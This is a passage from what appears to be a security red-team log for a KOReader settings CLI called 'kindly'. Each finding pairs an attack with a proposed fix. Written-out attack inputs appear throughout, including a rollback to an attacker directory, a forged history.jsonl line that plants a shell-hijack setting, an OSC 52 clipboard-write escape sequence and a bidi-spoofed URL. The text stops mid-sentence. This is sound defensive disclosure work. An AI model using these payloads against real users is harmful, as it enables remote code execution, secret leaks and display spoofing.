`setup:import` / `apply`, which produce snapshots at predictable
`.kindly/pre-*/` paths. But nothing in `executeRollback` anchors
the snapshot path to those locations, nor checks that the
containing dir is a kindly-authored one (there is no
`.kindly-snapshot` marker, no HMAC, no hash check against
`history.jsonl`). Any directory containing a file literally named
`plugins-patches.tar.gz` is a valid rollback source.

**Observed behavior.** Attacker prepared
`/tmp/kindly-s51-live/attacker-snapshot/plugins-patches.tar.gz`
containing a minimal `plugins/evil.koplugin/` with a marker-writer
+ outbound HTTP call. A single invocation:

```
kindly rollback /tmp/kindly-s51-live/attacker-snapshot \
    --mount /tmp/kindly-s51-live/fixture --no-safety-snapshot
```

reports `✓ restored 2 plugin/patch file(s)` — no warning, no
prompt. `ls koreader/plugins/evil.koplugin/` shows `_meta.lua` and
`main.lua` landed. KOReader-on-macOS launch → marker file written
at 2s + `GET /s51 HTTP/1.1 200` on the listener. End-to-end RCE
via `rollback` with zero flags needed (the `--no-safety-snapshot`
above was only to keep the harness clean; the attack works
identically with safety-snapshot enabled — it just leaves a
pre-rollback copy of the benign pre-state).

**Severity rating: high (RCE).** Same terminal impact as S44/S46/
S49. Social-engineering footprint is closest to S46: "run
`kindly rollback <path>` to undo your last import using this
known-good snapshot I sent you." Distinct from S44 in that this
does not require even a packaged tarball — the attacker just
tells the user to point rollback at a directory.

**History-entry forgery variant (noted, not exploited alone).**
`history/reader.ts:102-110` (`findHistoryEntryByIndex`) trusts
every line of `.kindly/history.jsonl` verbatim — no HMAC, no
signature. Any attacker who can write a single JSONL line there
(e.g., post S44/S46/S49 positioning) can plant a forged
`setup:import` entry whose `summary.pre_import_path` points at
an attacker-controlled directory *anywhere on the filesystem*.
A subsequent `kindly rollback --to <N>` — the primary
user-facing rollback path — then delivers the S51 primitive
with the victim never picking a path. This stacks on top of S51
as a post-compromise persistence / recurring-RCE mechanism.

**Defense (extends §8.7).** The rollback trust gate must cover
both entry points: (a) reject `snapshotDir` arguments that are
not under `<cwd>/.kindly/{pre-import,pre-apply,pre-rollback,
backups}/`, and (b) HMAC every `.kindly/history.jsonl` line
when written so forged lines fail the MAC check on read. Anchor
the HMAC to a machine-local key at `.kindly/.secrets/mac.key`
(mode 0600, created on first `kindly` invocation, never shipped
in snapshots). Same key protects the rollback/restore path-
anchor decision and the defense against S44/S46/S47/S49.

Harness: `/tmp/kindly-s51-live/run.sh`. Reproducible in ~5s on
macOS with the KOReader emulator.

---

### S52 — FIFO / hardlink / device-node variants in tar (other-AI E-probe, live-verified)

**Third-AI E-probe delivered 2026-04-23. Extends S50's entry-type
gap beyond symlinks.** S50 surfaced the mode-column invariant break
for symlinks; the E-probe ran the obvious neighbors and found one
new live primitive (FIFO → kindly-side DoS), one defense-by-OS
(hardlink blocked by BSD tar's linkname rule, but not by kindly),
and one OS-layer stop (chardev blocked by non-root perms).

**FIFO (NEW live finding — DoS primitive):**
Tar with a FIFO entry at `plugins/trap.koplugin/hang` passes
`assertSafeArchive` (path clean, size trivial) and extracts as a
`prw-r--r--` named pipe under koreaderRoot. Any tool that
`readFileSync`s plugin files — `kindly doctor` listing plugins,
the plugin hash verifier inside `setup import --strict-imports`,
the Lua scanner in `classify.ts` — **blocks indefinitely** on the
FIFO read waiting for a writer. KOReader's own `dofile`/
`loadfile` would block the same way. Severity: nuisance-grade
DoS against kindly's own post-import commands (not code-exec,
but a reliable way to make a compromised fixture impossible to
audit via kindly). The attack shape: ship a plausible-looking
plugin tar with one FIFO in it, victim's next `kindly doctor`
hangs forever.

**Hardlink (masked by system tar, not kindly):**
BSD tar on macOS rejects `..` in hardlink linkname with
`"Path contains '..'"` — so on macOS the path-escape variant is
neutralized **at the tar binary level, not in kindly code**.
`isSafeRelativePath` only checks the entry's own path
(`plugins/evil.koplugin/main.lua`), never the link target —
`tar -tzf` hides it. On GNU tar (the binary present on the
Kindle mount when kindly runs there) this guard may not exist;
untested. **The gap in kindly's code is real** (`archive.ts:194-
199` filters by path only, not by type or linkname) — currently
masked by the host tar but not by any intentional kindly defense.

**Character device (OS-layer stop):**
`tar -xzf` with a chardev entry fails with `"Operation not
permitted"` for non-root processes. No kindly action needed.

**Defense.** Folds into §8.7's tar-tvzf mode-column filter —
explicitly reject any entry whose mode character is not `-`
(regular file) or `d` (directory). Closes FIFO immediately and
hardens the hardlink gap against a future GNU-tar-on-Linux
execution path where BSD tar's linkname rule doesn't apply.

Credit: other-AI red-team probe, integrated with live
verification on macOS fixture.

---

### S53 — `.kindly/` state is world-readable; SECRETs in backups (other-AI J-probe, confirmed 2026-04-23)

**SECRET exposure to any local user on a multi-user host, via
filesystem. Same class as S43 but a different channel.** All
kindly-created files under `.kindly/` inherit the process umask
(default 022 on macOS / most Linux), producing `drwxr-xr-x` on
directories and `-rw-r--r--` on files. `grep -rn "chmod\|umask"`
across `src/` returns zero hits — kindly never sets restrictive
permissions.

**Impact.** Any local user with read access to the cwd can
inspect:

- **`.kindly/backups/<ts>/settings.reader.lua`**: byte-exact
  copy of the pre-apply device state. `filterForYaml` is NOT
  run — these are raw Lua dumps. Every SECRET that was on
  device at backup time is present in plaintext (zlibrary
  password, kosync userkey, pinpadlock PIN, LocalSend PIN,
  calibre wireless password, etc.). Grepped live:
  `leaked-secret-pw` and `leaked-kosync-key` both present
  verbatim.
- **`.kindly/pre-import/<ts>/settings.reader.lua`** and
  **`.kindly/pre-rollback/<ts>/settings.reader.lua`**: same
  story — safety snapshots are raw byte copies.
- **`.kindly/history.jsonl`**: full mutation audit trail —
  every `setup:import`, `apply`, `rollback`, `snapshot`,
  `restore` logged with `backup_path`, `pre_import_path`,
  `snapshot_dir`, `setup_id`, timestamps, labels. Reveals
  filesystem layout, user's workflow, tooling cadence.

**Threat model relevance.** Kindly's `CLAUDE.md` explicitly
scopes the tool as "single-user desktop". J-probe still
flagged this because single-user is porous:

- Admin + regular user on same macOS box (common in families /
  households). Other user can `find / -name .kindly` and harvest.
- Background sync daemons (iCloud, Dropbox, Time Machine)
  running under different UIDs pick up the world-readable bytes.
- CI/dev environments where kindly runs inside a repo that's
  world-readable to the developer's system accounts (Spotlight
  indexer, LSP language servers sandboxed under other UIDs).
- Future Linux/server execution paths (kindly as a cron/daemon
  on a shared box) — same perms, bigger surface.

**Defense.** Explicitly `chmod 0700` on `.kindly/` at creation,
`chmod 0600` on every file written inside it. Locations:
`src/fs/safeWrite.ts:76` (backups `mkdirSync`), `:85`
(`openSync` for `.tmp`), `src/history/writer.ts:143`
(`mkdirSync` for `.kindly`), `:169` (`openSync` for
`history.jsonl`), plus the `pre-import` / `pre-rollback` /
`pre-restore` dir creations in their respective callers. Run a
`grep -rn "mkdirSync.*\.kindly\|openSync.*\.kindly"` pass to
catch all call sites.

Fold into a new §8.9: "restrictive permissions on kindly-
created state under `.kindly/`". Independent from §8.7
(HMAC-anchored trust) — this one is purely about preventing
readers-who-shouldn't-read, not writers-who-shouldn't-write.

Credit: other-AI red-team J-probe. No KOReader launch needed —
pure filesystem audit.

---

### S54 — patch priority-prefix interposition (code-confirmed, S4 variant)

**Social-engineering + timing refinement on top of S4. Confirmed by
source audit of `/Users/claw/Projects/koreader/frontend/userpatch.lua`
and `src/setup/files.ts` / `src/setup/unpack.ts`.**

KOReader's userpatch loader (`userpatch.lua:10-16`) maps the numeric
prefix of each `koreader/patches/N-<name>.lua` file to one of five
phases:

| Prefix | Phase | When |
|--------|-------|------|
| `0-` | `early_once` | Very first, startup after OTA (once only) |
| `1-` | `early` | Startup, every boot |
| `2-` | `late` | After UIManager ready |
| `8-` | `before_exit` | Before settings save |
| `9-` | `on_exit` | Final shutdown |

Within each phase, `runUserPatchTasks()` (`userpatch.lua:47-88`)
sorts files by natural-order alphanumeric and `dofile()`s them in
that order — plugins are instantiated *much later*, post-UIManager.
So any `0-*.lua` gets **first execution** before a single plugin
constructor runs.

**Kindly's validation gap.** `setup/files.ts:78-104` collects
patches via `.endsWith(".lua")` + `isSafeRelativePath` only — zero
prefix awareness. `setup/unpack.ts:105-106` treats patches as
generic `EmbeddedFile[]` with hash + path-safe checks. The shipped
set `{0-intercept.lua, 2-analytics.lua}` is accepted as two
distinct paths (no collision), no warning about the priority gap,
no detection that one patch claims the `early_once` slot.

**Attack shape.** Fat `.kset` ships a legit-looking
`2-analytics.lua` (the one the user actually asked for — e.g. a
popular KOReader forum patch) alongside `0-intercept.lua`. The
importer reads the install summary as `patches (2 file(s))` — both
under the scanner. Under strict mode, both pass the evadable scanner
(same S3/S4 byte-table trick). On device, `0-intercept.lua` fires
first at `early_once` and can monkey-patch `require`, `dofile`,
`logger`, or plug into `UIManager` init hooks — before the plugin
loader runs and before the user's intended `2-analytics.lua`.

**Novel contribution over S4.** S4 established the patch-tier
trust hole. S54 adds: (a) prefix is a *timing primitive* — attackers
get pre-plugin code-exec, so even a hypothetical future "plugin
signing" hardening leaves patches as a first-run interposition
window; (b) prefix is a *visual hiding primitive* — an alphabetical
`ls patches/` puts attacker's `0-*.lua` at the top, but users who
asked for the analytics patch scan for the name they expect and miss
the unsolicited neighbor; (c) kindly's install summary does not
surface the execution-order implications (`"installed 2 patch(es)"`
reads as innocuous quantity, not "one patch claims the earliest
execution slot in the boot sequence").

**Defense.** Fully covered by §8.2's per-patch `--expect-patch-hash`
pinning — a patch with no pin is rejected under `--strict-imports`,
and the attacker cannot forge a pin the user didn't type. Additional
depth-in-defense to consider: surface prefix/phase at install-summary
time (`"patches will load in this order: 0-intercept.lua (early_once),
2-analytics.lua (late)"`) so the unsolicited patch is visually
un-hideable even pre-hash-pin.

No live repro needed — this is S4's primitive with a rename.

---

### S58 — case-collision bypass of plugin catalog hash verification (other-AI T-probe, live-confirmed)

**New MATCH-bypass class. Live-confirmed 2026-04-24.** Sibling of
S2-prime (which was about missing hashes in catalog); S58 is about
catalog hit/miss disagreement between kindly (case-sensitive JS
equality) and the underlying filesystem (case-insensitive on APFS
and vfat — both of which are kindly's realistic runtime targets).

**The primitive.** `src/lib/verify.ts:68-69` looks up plugin catalog
entries with `p.name === pluginName` — strict `===`, byte-equal.
Catalog entries are stored exactly as shipped (e.g., `SSH`,
`LocalSend`, `httpinspector`). `kindly setup import` with a plugin
directory named `ssh.koplugin` (lowercase) performs catalog lookup
against `"ssh"`, misses (`"ssh" !== "SSH"`), and the verdict is
**UNCATALOGUED** — hash verification never fires.

On APFS (macOS default) and vfat (the Kindle USB-mounted filesystem):
`ssh.koplugin/` and `SSH.koplugin/` resolve to **the same directory**.
So the on-device write order is:

1. Attacker ships `plugins/ssh.koplugin/main.lua` (malicious Lua).
2. `kindly setup import --accept-plugins` (without `--strict-imports`).
3. Catalog lookup for `"ssh"` → UNCATALOGUED (catalog has `"SSH"`).
4. Scanner returns clean (no strict mode → UNCATALOGUED accepted).
5. Files extracted to `koreader/plugins/ssh.koplugin/main.lua`.
6. **On APFS/vfat, this is the same directory as the user's real
   `SSH.koplugin/`** — attacker's `main.lua` silently overwrites the
   legitimate one.

Under `--strict-imports`: the post-fix (e8ce545) tightening blocks any
non-MATCH verdict including UNCATALOGUED, so strict-mode is safe.
Without strict mode (the default accept-plugins path, which S3 already
established as the trust-by-accept hole), S58 adds a second
catalog-bypass class: attacker doesn't need to hide obfuscation, just
needs to rename `SSH.koplugin` → `ssh.koplugin` in their tar.

**Blast radius.** Works against every catalog entry whose name is not
all-lowercase. Surveying the bundled catalog: `SSH`, `LocalSend`,
`httpinspector` (mixed), `KOSyncExtra` if present, etc. — roughly
half the catalog's 37 entries. Delivery matches S3/S4: fat `.kset`
with a renamed-case plugin directory.

**Defense.** Two-line fix at `src/lib/verify.ts:68-69`: compare case-
insensitively (`p.name.toLowerCase() === pluginName.toLowerCase()`),
or reject plugin directory names whose case doesn't match the
catalog entry exactly (flip the failure mode: instead of UNCATALOGUED
on case mismatch, emit a NAME_CASE_MISMATCH verdict under
`--strict-imports`). The latter is cleaner because it surfaces the
anomaly instead of quietly normalizing it.

Credit: other-AI T-probe, static + live confirmed 2026-04-24.

---

### S59 — non-table top-level `return "string"` = KOReader-bricking boot crash (live-verified + BB-verified)

**Severity upgrade (BB-probe, 2026-04-24).** Original write-up called this
"self-poisoning via kindly downstream". Live KOReader-on-macOS launch
confirms a **much harder failure mode**: KOReader itself crashes at
startup with `frontend/luasettings.lua:103: attempt to index field
'data' (a string value)`. Stack: `saveSetting → reader.lua:45 (main
chunk) → C boot`. No `pcall` rescue — the crash is in the main chunk
before any migration/recovery logic. Settings file remains poisoned on
disk, so **every subsequent boot re-crashes**. Recovery requires direct
filesystem edit (USB-mount `/Volumes/Kindle`, delete or fix
`settings.reader.lua`) — the user cannot open their e-reader in the
meantime.

Delivery via S38/S42/S43/S44/S46/S51: single apply-side primitive →
user reboots or opens KOReader → dead. This is the **first KOReader-side
bricking primitive** in the red-team (all prior primitives exec
attacker code or leak data; this one denies service to the device).

**Lower severity than S55/S56/S57 — a structural-class confusion that
requires attacker to already have settings-write access.** Found
while probing Lua-parser hostile structures.

**The gap.** `src/lua/reader.ts:101-116` (`parseFile`) returns
`LuaValue`, not `LuaTable`. A settings file `return "hax"` parses to
a bare string. Downstream consumers do not type-check:

- `luaToYaml(parsed, "minimal")` (src/schema/yaml.ts) iterates string
  characters via for-in on the string, emitting each char as a
  separate YAML key: `"0": j\n"1": u\n…`. **No error.**
- `mergeYamlIntoLua(parsed, {refresh_rate: 12})` (same file) merges
  the user's YAML *into the string*, producing
  `{"0":"j","1":"u",…,"refresh_rate":12}` — object-shaped garbage.

**Primitive.** Attacker with settings-write access (via any of
S38/S42/S43/S44/S46/S51) plants `return "evil"` in settings.reader.
lua. Victim's next `kindly pull` emits 400 lines of single-char YAML
keys; victim's next `kindly apply` (with any normal edit) writes
this character-soup table back to device. **Legitimate settings are
structurally erased.** User loses all their customizations — reading
positions, SSH hardening, plugin toggles, everything — with no error
message; kindly cheerfully reports success.

Recovery for the user: manually edit settings.reader.lua on device,
or accept factory defaults. Support burden: "why did kindly eat my
settings?"

**Live probe 2026-04-24.**
```
# /tmp/kindly-v-live/nontable.lua contains:
#   return "just a string, not a table"
parseSettingsFile → "just a string, not a table" (typeof string)
luaToYaml         → "\"0\": j\n\"1\": u\n\"2\": s\n\"3\": t\n\"4\": \" \"\n…"
mergeYamlIntoLua  → {"0":"j","1":"u","2":"s","3":"t",…}
```

All three accepted zero errors.

**Defense.** One check at `parseSettingsFile` exit:
`if (!isPlainTable(parsed)) throw new KindlyError(ErrorCodes.
LUA_INVALID_TOPLEVEL, …)`. Or one check at each downstream entry
(luaToYaml, mergeYamlIntoLua, classify, merge). The former is tighter
— one enforcement site, upstream of every consumer. KOReader itself
can load a non-table via `dofile` but treats it as an empty settings
bag (luasettings.lua's `:open` falls back to `{}` on non-table
returns), so kindly is stricter than KOReader but for a good reason:
kindly's ingestion pipeline should refuse malformed input rather than
corrupt-by-downstream-confusion.

---

### S60 — `parseSettingsFile` stack overflow on deep nesting (live-verified; BB downgraded to kindly-only DoS)

**Severity recalibration (BB-probe, 2026-04-24).** Live KOReader-on-macOS
launch against the same 50k-deep fixture shows that **KOReader gracefully
recovers** — `pcall(dofile, …)` catches the nested-table parse failure,
KOReader treats settings as empty, runs all one-time migrations from
scratch (20210503 → 20260306, all fired in the log), loads plugins,
opens the quickstart. Reader stays up.

So S60's blast radius is **kindly-only**, not cross-system. Every kindly
command that calls `parseSettingsFile` (pull, diff, apply, doctor,
rollback, restore, setup import) still crashes hard — victim still
cannot use kindly against the device. But the device itself keeps
working, which meaningfully changes the recovery story: user can open
KOReader, interact with it, and fix via the device's own settings UI.
S59 (same delivery primitives, different payload) is strictly worse
because it bricks the reader.

**DoS primitive on kindly CLI. Live-confirmed 2026-04-24 at nesting
depth ≈50000.** I-probe (section 3) confirmed 100 levels worked —
S60 pushes to real attacker depths.

**The gap.** `parseTable` calls `parseValue` for each entry's value,
which recurses through `parseTable` for nested tables. V8 default
call-stack limit (~10–15k frames with Bun's defaults) is blown at
around 30–50k depth. RangeError kills the command.

**Live probe.**
```
depth 20000: parse OK
depth 50000: RangeError (stack overflow)
```

A 50k-depth Lua file is ~450 KB — well inside kindly's 100 MB
archive cap. Wrap it in a restore tar or apply-side settings payload
and every kindly command that calls `parseSettingsFile` crashes
hard: `pull`, `diff`, `apply`, `doctor`, `rollback`, `restore`,
`setup import` (for the bundled settings.reader.lua inside the
kset).

**Attack shape.** Delivered via S38/S42/S43/S44/S46/S51 primitives.
After one successful poisoning, kindly becomes unusable against the
device — victim cannot even `kindly doctor` to investigate, because
doctor dies on the parse. **Recovery requires direct filesystem
edit.** For the kindly GUI vision (docs/97) that keeps a persistent
`kindly watch` subprocess, this is a push-button DoS of the whole
user surface.

**Defense.** Either (a) add a recursion-depth counter at `parseValue`
/ `parseTable` entry (throw `LUA_MAX_DEPTH_EXCEEDED` at, e.g., 64 —
real KOReader settings nest at most 3–4 levels, so 64 is generous);
or (b) rewrite `parseTable` iteratively with an explicit stack.
(a) is the one-line fix and strictly sufficient.

Same fix surface can cap *width* (max entries per table) and
*total-nodes* (max LuaValue count) as belt-and-suspenders against
related class of resource-exhaustion inputs that don't use depth.

---

### S61 — `--output` paths accept absolute/traversal/symlink writes (low severity; secondary-channel SECRET leak via `snapshot --output`)

**Audit-breadth finding 2026-04-24. Severity low: requires user to
type the flag.** Documents the surface for completeness and flags
one legitimate secondary-channel SECRET leak.

**The gap.** Four user-controlled `--output` paths all use
`resolve(env.cwd, opts.output)` with no path-safety:

- `kindly init --output <path>` (`src/commands/init.ts:43`)
- `kindly pull --output <path>` (`src/lib/pull.ts:42`)
- `kindly snapshot --output <path>` (`src/commands/snapshot.ts:57-59`)
- `kindly setup export --output <path>` (`src/lib/setupExport.ts:
  182-183`)

`resolve` happily accepts absolute (`/etc/passwd`), traversal
(`../../../home/other/secret.yml`), and any existing symlink at the
resolved location is followed by `writeFileSync` — writing through
to the target. `--force` on pull/init suppresses the existsSync
guard.

**The one non-self-inflicted concern.** `kindly snapshot --output
/tmp/public/share.tar.gz` writes a **plaintext-SECRET fat tar** to a
shared-readable location. This is a **secondary S53 channel**: S53
covered plaintext SECRETs in `.kindly/backups/`; S61 extends to
attacker- or script-chosen snapshot-output paths. Same fix class —
`chmod 0600` the output file after write, regardless of location.

The other three (`init`, `pull`, `setup export`) emit content that's
already SECRET-filtered (init = hardcoded preset; pull = filterForYaml
strips SECRETs; setup export = filterForYaml strips SECRETs from
manifest but **plugin Lua files are executable code** shipped in
the archive — low risk because the user chose the output path
themselves, but document the byte-shape of what's being written).

**Defense.** Part of §8.9 scope — `writeFileSecure` helper used at
every kindly-file-write site (safeWrite, history/writer, snapshot
output, setup-export output) that chmods 0600 unconditionally. Also
consider a warning when `--output` resolves outside cwd
("`writing to /tmp/public/share.tar.gz — outside current directory`")
so scripted misuse at least emits a visible note.

---

### S62 — `kindly pull --full` emits EPHEMERAL PII with no warning (live-verified 2026-04-24)

**New leak surface. Live-verified 2026-04-24.** `--full` is documented as
"include ephemerals" (`lastfile`, `lastdir`, `menu_search_string`,
`quote_deck_pos`, `LocalSend_last_update_check`, `last_migration_date`,
etc., enumerated in `src/schema/classify.ts:130-156`). The CLI help
string frames it as a power-user knob for full fidelity snapshots. But
several EPHEMERAL keys carry **real PII**:

- `lastfile` — full filesystem path of last-opened book (reveals folder
  hierarchy, e.g. `/home/victim/Documents/medical/…`)
- `lastdir` — last directory browsed (same)
- `menu_search_string` — literal last search query the user typed into
  KOReader's menu (probe emitted
  `MARKER_SEARCH_personal_query_for_taxes_divorce_2024`)
- `quote_deck_pos` — reading-position breadcrumb per book
- `LocalSend_last_update_check` — outbound-network timestamp

**Live probe (2026-04-24).** Fixture with the above values seeded;
`kindly pull --full --output dump-full.yaml` produced a YAML that
contained every one of them verbatim, no `[EPHEMERAL]` tag, no
"this output contains a literal search query / folder path" warning,
no separate file for PII. The command emits a single-line confirmation
("`✓ wrote dump-full.yaml (N bytes)`") and exits 0.

**Why it's a real finding rather than "user asked for it".** S53
established that `.kindly/` state is world-readable and contains
SECRETs; the defense is §8.9 (chmod 0600). `pull --output foo.yaml` writes
to user-chosen path with user-chosen permissions (see S61), so any
`--full` pull that gets shared on a forum, pasted into a bug report,
or committed to a public git repo ("here's my KOReader config, hope it
helps") transits the user's reading history and search queries to
strangers. The user's mental model for `pull --full` is "include more
keys"; the actual semantic is "include more keys **including PII**".

**Defense.** Three non-exclusive moves:

1. Split EPHEMERAL into two tiers — `EPHEMERAL_VOLATILE` (timestamps,
   counters, cache paths — safe to share) vs. `EPHEMERAL_PII` (paths,
   queries, reading positions — never share). `--full` includes volatile
   only; new `--full-pii` gate for the second tier.
2. When `--full` (or `--full-pii`) resolves any PII key, emit a
   single-line stderr warning before writing: `"output includes N
   ephemeral key(s) with paths/queries — do not share publicly"`.
3. `pull --output` inherits §8.9's `writeFileSecure` chmod 0600, same
   as S61.

Medium severity — self-inflicted at the flag level, but the framing
("include ephemerals") actively mis-prices the cost.

---

### S63 — forged `history.jsonl` + `kindly rollback --to N` = attacker-Lua on device (live-verified 2026-04-24)

**New silent-ingestion surface. Live-verified 2026-04-24.** Y-probe
(2026-04-24) confirmed that `src/history/reader.ts:70` does
`JSON.parse(line) as HistoryEntry` — an unchecked TypeScript cast
with zero Zod validation. `findHistoryEntryByIndex` and
`countAllHistory` don't invoke the renderer, so forged entries
flow straight through to `resolveSnapshotFromHistory`
(`src/commands/rollback.ts:245-298`), which at `:268` computes
`snapshotDir = dirname(s.backup_path)` and returns it to `runRollback`.
No HMAC, no path-constraint that `backup_path` live under
`.kindly/backups/`, no catalog.

**Attack shape (live-verified).**

1. Attacker writes one line to `<victim-cwd>/.kindly/history.jsonl`:
   ```json
   {"ts":"2026-04-22T08:00:00.000Z","cmd":"apply","label":"legit-looking-restore","kindly_version":"0.11.1","index":1,"summary":{"backup_path":"/tmp/kindly-dd-live/attacker-backup/settings.reader.lua","changed":5}}
   ```
2. Attacker plants `/tmp/kindly-dd-live/attacker-backup/settings.reader.lua`
   with whatever payload (probe used
   `ATTACKER_FORGED_KEY = "DD_PROBE_LANDED"`, `terminal_shell = "/bin/sh"`,
   `home_dir = "/tmp/attacker-controlled"`, `httpinspector_port = "4952"`).
3. Victim runs `kindly rollback --to 1 --mount /tmp/kindly-dd-live/fixture`.
4. Kindly prints `rollback from /tmp/kindly-dd-live/attacker-backup`
   and exits 0. Fixture's `settings.reader.lua` now contains attacker
   keys verbatim, including the `terminal_shell` hijack that feeds S9.

**Severity sibling to S51.** S51 needed the user to type the attacker
path (`kindly rollback /tmp/attacker-dir`); S63 needs the user to type
only the index (`kindly rollback --to 1`). The user never sees the
forged path — `kindly history` is the natural reconnaissance command,
and it crashes (Y-probe, see below) on forged entries, so the user's
instinct is to just pick the oldest index and roll back.

**Variant verification (2026-04-24).** `resolveSnapshotFromHistory` at
rollback.ts:267-275 has **three** trust points, one per entry type:

- `entry.cmd === "apply"` → `dirname(s.backup_path)` (original probe)
- `entry.cmd === "setup:import"` → `s.pre_import_path`
- `entry.cmd === "rollback"` → `s.pre_rollback_path`

All three verified live on 2026-04-24: forged JSONL entries with each
`cmd` + matching path field landed attacker settings on the fixture.
`S63A_MARKER = "PRE_IMPORT_PATH_TRUSTED"` and `S63B_MARKER =
"PRE_ROLLBACK_PATH_TRUSTED"` proved the pre_import and pre_rollback
branches respectively. **Attacker has three cover stories** (apply /
setup:import / rollback), all equally trusted. The label field is also
attacker-controlled — "fake-setup-import" displays cleanly in
`kindly history`, letting the attacker choose a legitimate-sounding
line.

**Plus Y-probe DoS.** `src/commands/history.ts:110` does
`e.ts.replace(…)` on the parsed entry; Y-probe showed a forged line
with `"ts": 12345` (number, not string) crashes `kindly history` with
`e.ts.replace is not a function`. Compound: (a) attacker writes a
forged entry with bogus ts, (b) `kindly history` now unusable, (c)
user runs `kindly rollback --to <N>` blind because history is broken,
(d) rollback trusts the forged entry.

**Defense.** Folds into §8.7 (rollback trust gate already scoped to
S44/S46/S49/S51):

1. `HistoryEntrySchema` in Zod with `.strict()`, rejects non-integer
   `index`, non-string `ts`, and constrains `backup_path` /
   `pre_import_path` / `pre_rollback_path` to descendants of
   `<cwd>/.kindly/`.
2. HMAC-sign every history line on write; verify on read; invalid
   lines are skipped with a warning (not silently accepted, not
   crashing the renderer).
3. Renderer must tolerate malformed entries (type-guard `e.ts` before
   calling `.replace()`) — defense-in-depth against a Y-probe-style
   DoS even if HMAC catches the tampering.

---

### S64 — `plugins_disabled` as YAML array silently re-enables every disabled plugin (live-verified 2026-04-24, AA-probe)

**New shape-confusion primitive. Live-verified 2026-04-24.** S27 covered
`plugins_disabled.<name>: false` (map-shaped) as a per-key flip.
AA-probe found a wholesale-replace primitive: `plugins_disabled:
[SSH, terminal]` (YAML list) parses as JS array, `mergeYamlIntoLua`
(`src/schema/yaml.ts:108-128`) replaces wholesale when types differ
between YAML and device (object vs. array is a type mismatch, so no
sub-merge), and the Lua writer emits `["plugins_disabled"] = { [1] =
"SSH", [2] = "terminal" }` — an integer-keyed Lua table.

KOReader's `pluginloader.lua:174` does `plugins_disabled[plugin_name]`
(string-key lookup). On an integer-keyed table, `t["SSH"]` returns
`nil` → **every** previously-disabled plugin is treated as enabled,
not just the ones the attacker named. Including `terminal` (S17
primitive), `SSH`, `httpinspector`, `LocalSend`, `calibre`,
`wallabag`, `opds` — all back on, one line of YAML, no flags, exit 0.

**Why §8.1's proposed check misses it.** The W39 hardening proposal
(§8.1, `value === false` gate on `plugins_disabled.<name>`) inspects
*map values*, not container shape. A YAML list never hits the per-key
loop — the container is an array, not an object.

**Defense.** Fold into §8.1:

- Reject (or refuse-to-merge) any `plugins_disabled` whose YAML shape
  is not a plain object. Emit
  `plugins_disabled must be a map of name → bool, got array`.
- Alternatively: normalize YAML-list form to map-with-true values
  (attacker intent was probably "disable these") and warn. Normalization
  is forgiving but auditable; rejection is stricter but breaks a few
  plausible user mistakes.

Recommendation: **reject**, because the wholesale-replace primitive is
too strong to paper over with a normalization kindness.

---

### S65 — Unicode bidi / RTL-override in manifest identity fields bypasses §8.3 (II-probe, live-verified 2026-04-24)

**New display-trust bypass. Live-verified 2026-04-24 via two-AI II-probe.**
S7/S40 are the C0/C1 ANSI-escape siblings; S65 is the Unicode-bidi
sibling. The proposed §8.3 sanitizer (C0 `0x00-0x1F` + C1 `0x80-0x9F`)
strips ANSI CSI/OSC payloads — but **U+202E (RTL override) is codepoint
0x202E, well above C1**. A `meta.author: "alice‮ecila"` crafted
`.kset.yaml` passes the proposed sanitizer cleanly and renders in
bidi-aware terminals as reversed text.

**Live probe (II-probe, 2026-04-24).** Hexdump of `kindly setup inspect`
output shows U+202E bytes `e2 80 ae` landing at four separate offsets
— `name`, `author`, `source`, `description`. Five ASCII bytes
("alice"), three UTF-8 bytes for U+202E, then five bytes that render
RTL ("ecila" displayed right-to-left). `author` and `description` are
bare `z.string().optional()`. **`source_url` is *not* guarded by
`z.string().url()` despite that validator being in place** —
`z.string().url()` accepts U+202E inside the path/host component
(live-verified: `https://github.com/anthropic-kindly‮gro.reliove.cdn`
parses clean). On a bidi-aware TTY, the rendered display is
`https://github.com/anthropic-kindlyndc.evoiler.org (UNVERIFIED)` —
the W33 "display but mark UNVERIFIED" strategy breaks because the
displayed bytes don't match what was written. Setup import renders the
same fields at `setup.ts:718-741`, so the spoof holds *at the moment
of trust-granting*.

**Defense.** Extend §8.3's sanitizer from C0/C1-only to also strip the
Unicode bidi control block:

- U+202A – U+202E (LRE, RLE, PDF, LRO, RLO — embeddings + overrides)
- U+2066 – U+2069 (LRI, RLI, FSI, PDI — directional isolates)
- U+200E, U+200F (LRM, RLM — directional marks)

Alternative: Unicode NFKC normalize + reject strings where
`/[‪-‮⁦-⁩‎‏]/` matches, with a specific
diagnostic ("`meta.author` contains Unicode bidi control characters").
Same surface as S7/S40 — single shared `sanitizeIdentityString` helper.

---

### S66 — OSC 52 clipboard-write injection via plugin directory names / `kindly doctor` (VV-probe, live-verified 2026-04-24)

**New side-channel primitive. Live-verified 2026-04-24 via two-AI
VV-probe.** S55 confirmed ANSI-escape passthrough in `kindly doctor`'s
uncataloguedPlugins detail (`src/lib/doctor.ts:381`) and unknown-keys
sample (`:217`). VV escalates that passthrough class with **OSC 52**,
which is a terminal-protocol clipboard-write sequence:

```
\x1b]52;c;<base64-payload>\x07
```

iTerm2, kitty, and most xterm variants honor OSC 52 and **silently
write the decoded base64 to the system clipboard on render**. No
dialog, no prompt. Chrome/Firefox/browsers don't honor it, but
terminal-native workflows absolutely do.

**Live probe (VV-probe, 2026-04-24).** Three surfaces confirmed at the
byte level:

1. **`kindly doctor` uncatalogued plugin list** (`src/lib/doctor.ts:381`) —
   planted plugin dir `\x1b]52;c;ZXZpbA==\x07EVIL.koplugin`. Doctor
   stdout at offset 0x0d5: `1b 5d 35 32 3b 63 3b 5a 58 5a 70 62 41 3d 3d
   07` — full OSC 52 intact.
2. **`kindly setup inspect` author/description** (`setup.ts:280,282,293`) —
   hexdump at offsets 0x137 / 0x16e shows `1b 5d 35 32 3b 63 3b 63 48
   64 75 5a 57 51 3d 07` (base64 "pwned") passed through.
3. **`kindly history` label** — history.jsonl stores the raw label
   (writer.ts:163 doesn't filter), renderer prints verbatim. Hexdump at
   offset 0x28. Even when the rendered label truncates with `…` after
   the payload, the ESC+payload+BEL sequence arrives *contiguously*, so
   OSC-honoring terminals still process the clipboard write before
   truncation.

**Trust surface per channel.** The label channel is **self-inflicted**
— the user typed `--label "…"` themselves, so injection requires the
user to paste OSC 52 into their own shell, which is the paste-hijack
pre-condition, not an attack delivery. Surfaces 1 and 2 are
**attacker-controlled**: plugin directory basenames come from a tar
extract (S44/S46/S51 delivery chain) and manifest fields come from
the attacker's `.kset.yaml`. The label surface still matters as
